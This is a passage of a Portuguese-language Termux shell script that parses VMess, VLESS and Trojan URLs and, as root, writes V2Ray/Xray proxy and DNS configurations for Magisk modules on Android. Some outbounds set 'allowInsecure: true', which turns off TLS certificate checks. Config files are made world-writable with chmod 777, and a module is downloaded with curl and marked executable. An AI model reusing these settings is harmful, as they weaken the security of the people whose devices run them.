su -c sed -i 1,999d /data/v2ray/config.json

config=$(echo -e "$carioca" | tr -s '&' '\n')

WSBug=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d'?' -f1 | cut -d ':' -f1)


Dominio=$(echo "$config" | grep "host" | cut -d'=' -f2)


User=$(echo -e "$config" | grep '@' | cut -d'/' -f3 | cut -d'@' -f1)



port=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d'?' -f1 | cut -d ':' -f2)

encript=$(echo "$config" | grep "encryption" | cut -d'=' -f2)

path=$(echo "$config" | grep "path" | cut -d'=' -f2 | sed 's/%2F/\//g' | cut -d'#' -f1 | sed 's/%2f/\//g' | sed 's/%3f/?/g' | sed 's/%/@u00/g' | sed "s/@/\\\/g")


case $port in
443)OuthLock="+outbounds+: [
    {
      +mux+: {
        +concurrency+: -1,
        +enabled+: false
      },
      +protocol+: +vless+,
      +settings+: {
        +vnext+: [
          {
            +address+: +$WSBug+,
            +port+: $port,
            +users+: [
              {
                +alterId+: 0,
                +encryption+: +$encript+,
                +flow+: ++,
                +id+: +$User+,
                +level+: 8,
                +security+: +auto+
              }
            ]
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: +tls+,
        +tlsSettings+: {
          +allowInsecure+: true,
          +serverName+: +$Dominio+
        },
        +wsSettings+: {
          +headers+: {
            +Host+: +$Dominio+
          },
          +path+: +$path+
        }
      },
      +tag+: +proxy+
    },
    {
      +protocol+: +freedom+,
      +settings+: {},
      +tag+: +direct+
    },
    {
      +protocol+: +blackhole+,
      +settings+: {
        +response+: {
          +type+: +http+
        }
      },
      +tag+: +block+
    }
  ],"
;;







80)OuthLock="+outbounds+: [
    {
      +mux+: {
        +concurrency+: -1,
        +enabled+: false
      },
      +protocol+: +vless+,
      +settings+: {
        +vnext+: [
          {
            +address+: +$WSBug+,
            +port+: $port,
            +users+: [
              {
                +alterId+: 0,
                +encryption+: +$encript+,
                +flow+: ++,
                +id+: +$User+,
                +level+: 8,
                +security+: +auto+
              }
            ]
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: ++,
        +wsSettings+: {
          +headers+: {
            +Host+: +$Dominio+
          },
          +path+: +$path+
        }
      },
      +tag+: +proxy+
    },
    {
      +protocol+: +freedom+,
      +settings+: {},
      +tag+: +direct+
    },
    {
      +protocol+: +blackhole+,
      +settings+: {
        +response+: {
          +type+: +http+
        }
      },
      +tag+: +block+
    }
  ],"
;;




*)echo
echo
echo -e "${RED}Configuração Invalida${NADA}"
sleep 5
MagiskRay1
;;
esac

echo "
  {
  +log+: {
    +access+: +none+,

    +error+: +/data/v2ray/run/error.log+,

    +loglevel+: +warning+
  },
  +inbounds+: [{
    +port+: 65535,

    +listen+: +0.0.0.0+,

    +tag+: +proxy-inbound+,

    +protocol+: +dokodemo-door+,

    +settings+: {
      +udp+: true,
      +userLevel+: 8,
      +network+: +tcp,udp+,
      +followRedirect+: true
    },

    +sniffing+: {
      +enabled+: false
    }
  }],
$OuthLock
  +policy+: {
    +levels+: {
      +8+: {
        +connIdle+: 300,
        +downlinkOnly+: 1,
        +handshake+: 4,
        +uplinkOnly+: 1
      }
    },
    +system+: {
      +statsOutboundUplink+: false,
      +statsOutboundDownlink+: false
    }
  },
  +routing+: {
    +domainStrategy+: +AsIs+,
    +rules+:[]
  },
  +other+: {}
}
" >> v2ray.txt 
su -c cp v2ray.txt /data/v2ray/config.json
su -c sed -i 's/+/\"/g' /data/v2ray/config.json
su -c chmod 777 /data/v2ray/config.json







rm -f appid.list
abc=$(su -c cat /data/v2ray/appid.list | grep -c '0')
case $abc in
1);;
*)echo -e "0" >> appid.list && su -c cp appid.list /data/v2ray/appid.list;;
esac

sudo bash /data/adb/modules/v2ray/scripts/v2ray.service stop > /dev/null 2>&1
echo -e "${NADA}"
echo -e "${DESTACAR}"
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
case $optione1 in
*)MagiskRay1;;
esac
}














UrlTrojan(){
su -c rm -f v2ray.txt

echo
echo -ne "${DESTACAR}Cole a URL Trojan: ${GREEN}"
read config

su -c sed -i 1,999d /data/v2ray/config.json

WSBug=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d'?' -f1 | cut -d ':' -f1)


Dominio=$(echo "$config" | grep "host" | cut -d'=' -f2 | cut -d'&' -f1)


User=$(echo -e "$config" | grep '@' | cut -d'/' -f3 | cut -d'@' -f1)

port=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d'?' -f1 | cut -d ':' -f2 | tr -d '/')

path=$(echo "$config" | tr -s '&' '\n' | grep "path" | cut -d'=' -f2 | sed 's/%2F/\//g' | cut -d'#' -f1 | sed 's/%2f/\//g' | sed 's/%3f/?/g' | sed 's/%/@u00/g' | sed "s/@/\\\/g")




aiu7=$(echo -e "$path" | wc -m)
case $aiu7 in
0)path="/howdy"
WSBug=$(echo -e "$config" | cut -d'@' -f2 | cut -d':' -f2 | cut -d '/' -f2)

Dominio=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d':' -f1)

User=$(echo -e "$config" | grep '@' | cut -d'/' -f3 | cut -d'@' -f1)

port=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d':' -f2 | cut -d'/' -f1)

;;
1)path="/howdy"
WSBug=$(echo -e "$config" | cut -d'@' -f2 | cut -d':' -f2 | cut -d '/' -f2)

Dominio=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d':' -f1)

User=$(echo -e "$config" | grep '@' | cut -d'/' -f3 | cut -d'@' -f1)

port=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d':' -f2 | cut -d'/' -f1)

;;
*);;
esac

case $port in
443)
echo -e "{
  +log+: {
    +access+: +none+,

    +error+: +/data/v2ray/run/error.log+,

    +loglevel+: +none+
  },
  +inbounds+: [{
    +port+: 65535,

    +listen+: +0.0.0.0+,

    +tag+: +proxy-inbound+,

    +protocol+: +dokodemo-door+,

    +settings+: {
      +udp+: true,
      +userLevel+: 8,
      +network+: +tcp,udp+,
      +followRedirect+: true
    },

    +sniffing+: {
      +enabled+: false
    }
  }],
 +outbounds+: [
    {
      +mux+: {
        +enabled+: false
      },
      +protocol+: +trojan+,
      +settings+: {
        +servers+: [
          {
            +address+: +$WSBug+,
            +level+: 8,
            +password+: +$User+,
            +port+: 443
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: +tls+,
        +tlsSettings+: {
          +allowInsecure+: true,
          +serverName+: +$Dominio+
        },
        +wsSettings+: {
          +headers+: {
            +Host+: +$Dominio+
          },
          +path+: +$path+
        }
      },
      +tag+: +TROJAN+
    }
  ],
  +policy+: {
    +levels+: {
      +8+: {
        +connIdle+: 300,
        +downlinkOnly+: 1,
        +handshake+: 4,
        +uplinkOnly+: 1
      }
    },
    +system+: {
      +statsOutboundUplink+: false,
      +statsOutboundDownlink+: false
    }
  },
  +routing+: {
    +domainStrategy+: +AsIs+,
    +rules+:[]
  },
  +other+: {}
}
" >> v2ray.txt
;;




*)echo
echo
echo -e "${RED}Configuração Invalida${NADA}"
sleep 5
MagiskRay1
;;
esac


su -c cp v2ray.txt /data/v2ray/config.json
su -c sed -i 's/+/\"/g' /data/v2ray/config.json
su -c chmod 777 /data/v2ray/config.json




rm -f appid.list
abc=$(su -c cat /data/v2ray/appid.list | grep -c '0')
case $abc in
1);;
*)echo -e "0" >> appid.list && su -c cp appid.list /data/v2ray/appid.list;;
esac

sudo bash /data/adb/modules/v2ray/scripts/v2ray.service stop > /dev/null 2>&1
echo -e "${NADA}"
echo -e "${DESTACAR}"
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
case $optione1 in
*)MagiskRay1;;
esac
}




















































































































MagiskRay2(){

su -c rm -f dnsjson.txt

DNSJSON="{
    +dns+: {
        +hosts+: {
            +domain:googleapis.cn+: +googleapis.com+,
            +domain:xray.helper+: +127.0.0.1+
        },
        +servers+: [
            {
                +address+: +119.29.29.29+,
                +domains+: [
                    +geosite:cn+
                ],
                +expectIPs+: [
                    +geoip:cn+
                ],
                +port+: 53
            },
            {
                +address+: +223.5.5.5+,
                +domains+: [
                    +geosite:cn+
                ],
                +expectIPs+: [
                    +geoip:cn+
                ],
                +port+: 53
            },
            +8.8.8.8+,
            +1.1.1.1+,
            +https+local://doh.dns.sb/dns-query+
        ],
        +tag+: +dns+
    }
}
"
clear
echo -e "${DESTACAR}Xray Core Magisk${NADA}"
echo
echo -e "${RED}Necessario ter instalado o modulo do magisk:\n${GREEN}Xray For Android${DESTACAR}"
echo
echo -e "1 - Iniciar serviços V2RAY"
echo -e "2 - Parar serviços V2RAY"
echo -e "3 - Mudar configuração V2RAY"
echo -e "4 - Instalar sudo"
echo -e "5 - Corrigir instalação do Modulo"
echo -e "6 - Baixar Modulo"
echo -e "0 - Voltar"
echo
read -p "Escolha uma opção: " option
echo -e "${NADA}"
case $option in
1)SCRIPTS_DIR=/data/adb/xray/scripts
sudo bash ${SCRIPTS_DIR}/xray.service start
sudo bash ${SCRIPTS_DIR}/xray.tproxy enable

sleep 6

su -c settings put global airplane_mode_on 1
su -c am broadcast -a android.intent.action.AIRPLANE_MODE > /dev/null 2>&1 && su -c settings put global airplane_mode_on 0
su -c am broadcast -a android.intent.action.AIRPLANE_MODE > /dev/null 2>&1 
;;

2)SCRIPTS_DIR=/data/adb/xray/scripts
sudo bash ${SCRIPTS_DIR}/xray.service stop
sudo bash ${SCRIPTS_DIR}/xray.tproxy disable;;

4)pkg install tsu -y; main;;
3)
echo -e "${DESTACAR}1 - Configuração URL VMESS"
echo -e "2 - Configuração URL VLESS"
echo -e "3 - Configuração URL Trojan"

echo
read -p "Escolha uma opção: " opi
echo -e "${NADA}"
case $opi in
1)UrlVmess2;;
2)UrlVless2;;
3)UrlTrojan2;;
*)MagiskRay2;;
esac
;;

5)echo
echo -e "${DESTACAR}Movendo o cURL pra pasta bin...${NADA}"
su -c cp /data/user/0/com.termux/files/usr/bin/curl /bin/curl
;;

6)
echo
echo -e "${DESTACAR}LIGUE A INTERNET${NADA}"

echo
read -n1 -p "DIGITE Y DEPOIS DE LIGAR" optione12 ; case $optione12 in 
  y|Y)echo ; echo ; curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/Xray && chmod +x Xray ; su -c mv Xray /sdcard/Download/Xray.zip ; echo -e "${GREEN}Modulo Xray.zip foi movido pra downloads${NADA}"; sleep 5 ;;
  esac
  
  ;;

0)MenuPrincipal;;
*)MagiskRay2;;
esac
echo -e "${DESTACAR}"
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
case $optione1 in
*)MagiskRay2;;
esac
}








UrlVmess2(){
su -c rm -f v2ray.txt

echo
echo -ne "${DESTACAR}Cole a URL VMESS: ${GREEN}"
read configur

su -c sed -i 1,999d /data/adb/xray/confs/dns.json
echo -e "$DNSJSON" >> dnsjson.txt
su -c cp dnsjson.txt /data/adb/xray/confs/dns.json
su -c chmod 777 /data/adb/xray/confs/dns.json

su -c sed -i 1,999d /data/adb/xray/confs/proxy.json
su -c sed -i 's/+/\"/g' /data/adb/xray/confs/dns.json
su -c sed -i 's/https\"local/https+local/g' /data/adb/xray/confs/dns.json
su -c chmod 777 /data/adb/xray/confs/dns.json


XequeMate=$(echo "$configur" | cut -d'/' -f3 | base64 -d)

WSBug=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep add | cut -d'"' -f4)


Dominio=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep host | cut -d'"' -f4)


User=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep '"id"' | cut -d'"' -f4)


path=$(echo "$XequeMate" | tr -s ',' '\n' | grep '"path"' | cut -d'"' -f4)


aid=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep 'aid"' | cut -d'"' -f4)


port=$(echo -e "$XequeMate" | tr -s ',' '\n' | grep 'port"' | cut -d'"' -f4)

case $port in
443)OuthLock="{
  +outbounds+: [
    {
      +tag+: +proxy+,
      +protocol+: +vmess+,
      +settings+: {
        +vnext+: [
          {
            +address+: +$WSBug+,
            +port+: $port,
            +users+: [
              {
                +id+: +$User+,
                +alterId+: $aid,
                +security+: +auto+,
                +encryption+: +none+,
                +flow+: ++
              }
            ]
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: +tls+,
        +tlsSettings+: {
          +allowInsecure+: false,
          +serverName+: +$Dominio+
        },
        +wsSettings+: {
          +path+: +$path+,
          +headers+: {
            +Host+: +$Dominio+
          }
        },
        +sockopt+: {
          +domainStrategy+: +UseIP+
        }
      },
      +mux+: {
        +enabled+: true,
        +concurrency+: 8
      }
    }
  ]
}"
;;





80)OuthLock="{
  +outbounds+: [
    {
      +mux+: {
        +concurrency+: 8,
        +enabled+: false
      },
      +protocol+: +vmess+,
      +settings+: {
        +vnext+: [
          {
            +address+: +$WSBug+,
            +port+: $port,
            +users+: [
              {
                +alterId+: $aid,
                +encryption+: +auto+,
                +flow+: ++,
                +id+: +$path+,
                +level+: 8,
                +security+: +auto+
              }
            ]
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: ++,
        +wsSettings+: {
          +headers+: {
            +Host+: +$Dominio+
          },
          +path+: +$path+
        }
      },
      +tag+: +proxy+
    },
    {
      +protocol+: +freedom+,
      +settings+: {},
      +tag+: +direct+
    },
    {
      +protocol+: +blackhole+,
      +settings+: {
        +response+: {
          +type+: +http+
        }
      },
      +tag+: +block+
    }
  ],
  +routing+: {
    +domainStrategy+: +IPIfNonMatch+,
    +rules+: []
  }
}"
;;

*)echo
echo
echo -e "${RED}Configuração Invalida${NADA}"
sleep 5
MagiskRay2
;;
esac

echo -e "$OuthLock" >> v2ray.txt 
su -c cp v2ray.txt /data/adb/xray/confs/proxy.json
su -c sed -i 's/+/\"/g' /data/adb/xray/confs/proxy.json
su -c chmod 777 /data/adb/xray/confs/proxy.json





SCRIPTS_DIR=/data/adb/xray/scripts
sudo bash ${SCRIPTS_DIR}/xray.service stop > /dev/null 2>&1
sudo bash ${SCRIPTS_DIR}/xray.tproxy disable > /dev/null 2>&1

echo -e "${NADA}"
echo -e "${DESTACAR}"
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
case $optione1 in
*)MagiskRay2;;
esac
}



















UrlVless2(){
su -c rm -f v2ray.txt

echo
echo -ne "${DESTACAR}Cole a URL VLESS: ${GREEN}"
read carioca

su -c sed -i 1,999d /data/adb/xray/confs/dns.json
echo -e "$DNSJSON" >> dnsjson.txt
su -c cp dnsjson.txt /data/adb/xray/confs/dns.json
su -c chmod 777 /data/adb/xray/confs/dns.json
su -c sed -i 's/+/\"/g' /data/adb/xray/confs/dns.json
su -c sed -i 's/https\"local/https+local/g' /data/adb/xray/confs/dns.json
su -c chmod 777 /data/adb/xray/confs/dns.json

su -c sed -i 1,999d /data/adb/xray/confs/proxy.json

config=$(echo -e "$carioca" | tr -s '&' '\n')

WSBug=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d'?' -f1 | cut -d ':' -f1)


Dominio=$(echo "$config" | grep "host" | cut -d'=' -f2)


User=$(echo -e "$config" | grep '@' | cut -d'/' -f3 | cut -d'@' -f1)



port=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d'?' -f1 | cut -d ':' -f2)

encript=$(echo "$config" | grep "encryption" | cut -d'=' -f2)

path=$(echo "$config" | grep "path" | cut -d'=' -f2 | sed 's/%2F/\//g' | cut -d'#' -f1 | sed 's/%2f/\//g' | sed 's/%3f/?/g' | sed 's/%/@u00/g' | sed "s/@/\\\/g")


case $port in
443)OuthLock="{
  +outbounds+: [
    {
      +tag+: +proxy+,
      +protocol+: +vless+,
      +settings+: {
        +vnext+: [
          {
            +address+: +$WSBug+,
            +port+: $port,
            +users+: [
              {
                +id+: +$User+,
                +alterId+: 0,
                +security+: +auto+,
                +encryption+: +$encript+,
                +flow+: ++
              }
            ]
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: +tls+,
        +tlsSettings+: {
          +allowInsecure+: false,
          +serverName+: +$Dominio+
        },
        +wsSettings+: {
          +path+: +$path+,
          +headers+: {
            +Host+: +$Dominio+
          }
        },
        +sockopt+: {
          +domainStrategy+: +UseIP+
        }
      },
      +mux+: {
        +enabled+: true,
        +concurrency+: 8
      }
    }
  ]
}"
;;







80)OuthLock="{
  +outbounds+: [
    {
      +mux+: {
        +concurrency+: 8,
        +enabled+: false
      },
      +protocol+: +vless+,
      +settings+: {
        +vnext+: [
          {
            +address+: +$WSBug+,
            +port+: $port,
            +users+: [
              {
                +alterId+: 16,
                +encryption+: +auto+,
                +flow+: ++,
                +id+: +$path+,
                +level+: 8,
                +security+: +auto+
              }
            ]
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: ++,
        +wsSettings+: {
          +headers+: {
            +Host+: +$Dominio+
          },
          +path+: +$path+
        }
      },
      +tag+: +proxy+
    },
    {
      +protocol+: +freedom+,
      +settings+: {},
      +tag+: +direct+
    },
    {
      +protocol+: +blackhole+,
      +settings+: {
        +response+: {
          +type+: +http+
        }
      },
      +tag+: +block+
    }
  ],
  +routing+: {
    +domainStrategy+: +IPIfNonMatch+,
    +rules+: []
  }
}"
;;




*)echo
echo
echo -e "${RED}Configuração Invalida${NADA}"
sleep 5
MagiskRay2
;;
esac

echo "$OuthLock" >> v2ray.txt 
su -c cp v2ray.txt /data/adb/xray/confs/proxy.json
su -c sed -i 's/+/\"/g' /data/adb/xray/confs/proxy.json
su -c chmod 777 /data/adb/xray/confs/proxy.json




SCRIPTS_DIR=/data/adb/xray/scripts
sudo bash ${SCRIPTS_DIR}/xray.service stop > /dev/null 2>&1
sudo bash ${SCRIPTS_DIR}/xray.tproxy disable > /dev/null 2>&1

echo -e "${NADA}"
echo -e "${DESTACAR}"
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
case $optione1 in
*)MagiskRay2;;
esac
}














UrlTrojan2(){
su -c rm -f v2ray.txt

su -c sed -i 1,999d /data/adb/xray/confs/dns.json
echo -e "$DNSJSON" >> dnsjson.txt
su -c cp dnsjson.txt /data/adb/xray/confs/dns.json
su -c chmod 777 /data/adb/xray/confs/dns.json
su -c sed -i 's/+/\"/g' /data/adb/xray/confs/dns.json

su -c sed -i 's/https\"local/https+local/g' /data/adb/xray/confs/dns.json

su -c chmod 777 /data/adb/xray/confs/dns.json


echo
echo -ne "${DESTACAR}Cole a URL Trojan: ${GREEN}"
read config

su -c sed -i 1,999d /data/adb/xray/confs/proxy.json

WSBug=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d'?' -f1 | cut -d ':' -f1)


Dominio=$(echo "$config" | grep "host" | cut -d'=' -f2 | cut -d'&' -f1)


User=$(echo -e "$config" | grep '@' | cut -d'/' -f3 | cut -d'@' -f1)

port=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d'?' -f1 | cut -d ':' -f2 | tr -d '/')

path=$(echo "$config" | tr -s '&' '\n' | grep "path" | cut -d'=' -f2 | sed 's/%2F/\//g' | cut -d'#' -f1 | sed 's/%2f/\//g' | sed 's/%3f/?/g' | sed 's/%/@u00/g' | sed "s/@/\\\/g")




aiu7=$(echo -e "$path" | wc -m)
case $aiu7 in
0)path="/howdy"
WSBug=$(echo -e "$config" | cut -d'@' -f2 | cut -d':' -f2 | cut -d '/' -f2)

Dominio=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d':' -f1)

User=$(echo -e "$config" | grep '@' | cut -d'/' -f3 | cut -d'@' -f1)

port=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d':' -f2 | cut -d'/' -f1)

;;
1)path="/howdy"
WSBug=$(echo -e "$config" | cut -d'@' -f2 | cut -d':' -f2 | cut -d '/' -f2)

Dominio=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d':' -f1)

User=$(echo -e "$config" | grep '@' | cut -d'/' -f3 | cut -d'@' -f1)

port=$(echo -e "$config" | grep '@' | cut -d'@' -f2 | cut -d':' -f2 | cut -d'/' -f1)

;;
*);;
esac

case $port in
443)
echo -e "{
  +inbounds+: [
    {
      +port+: 10808,
      +protocol+: +socks+,
      +settings+: {
        +auth+: +noauth+,
        +udp+: true,
        +userLevel+: 8
      },
      +tag+: +socks+
    }
  ],
  +outbounds+: [
    {
      +mux+: {
        +concurrency+: 0,
        +enabled+: false
      },
      +protocol+: +trojan+,
      +settings+: {
        +servers+: [
          {
            +address+: +$WSBug+,
            +level+: 8,
            +method+: +chacha20-poly1305+,
            +ota+: false,
            +password+: +$User+,
            +port+: 443
          }
        ]
      },
      +streamSettings+: {
        +network+: +ws+,
        +security+: +tls+,
        +tlsSettings+: {
          +allowInsecure+: true,
          +serverName+: +$Dominio+
        },
        +wsSettings+: {
          +headers+: {
            +Host+: +$Dominio+
          },
          +path+: +$path+
        }
      },
      +tag+: +TROJAN+
    }
  ],
  +policy+: {
    +levels+: {
      +8+: {
        +connIdle+: 300,
        +downlinkOnly+: 1,
        +handshake+: 4,
        +uplinkOnly+: 1
      }
    }
  }
}" >> v2ray.txt
;;




*)echo
echo
echo -e "${RED}Configuração Invalida${NADA}"
sleep 5
MagiskRay2
;;
esac


su -c cp v2ray.txt /data/adb/xray/confs/proxy.json
su -c sed -i 's/+/\"/g' /data/adb/xray/confs/proxy.json
su -c chmod 777 /data/adb/xray/confs/proxy.json



SCRIPTS_DIR=/data/adb/xray/scripts
sudo bash ${SCRIPTS_DIR}/xray.service stop > /dev/null 2>&1
sudo bash ${SCRIPTS_DIR}/xray.tproxy disable > /dev/null 2>&1

echo -e "${NADA}"
echo -e "${DESTACAR}"
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
case $optione1 in
*)MagiskRay2;;
esac
}


MenuPrincipal
